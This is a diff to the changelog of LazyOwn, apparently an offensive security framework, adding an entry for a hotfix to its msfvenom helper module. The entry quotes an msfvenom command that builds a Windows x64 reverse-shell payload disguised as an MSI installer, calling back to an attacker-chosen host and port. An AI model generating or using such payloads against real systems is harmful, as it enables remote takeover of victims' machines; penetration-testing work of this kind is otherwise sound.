@@ -2,6 +2,13 @@
 # Changelog
 
 
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): add option 20 of lazymsfvenom module \n\n Version: release/0.2.17 \n\n f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi' \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Nov 11 22:58:46 2024 -0300 \n\n Hora: 1731376726
+
+
 ### Otros
 
 ### Otros
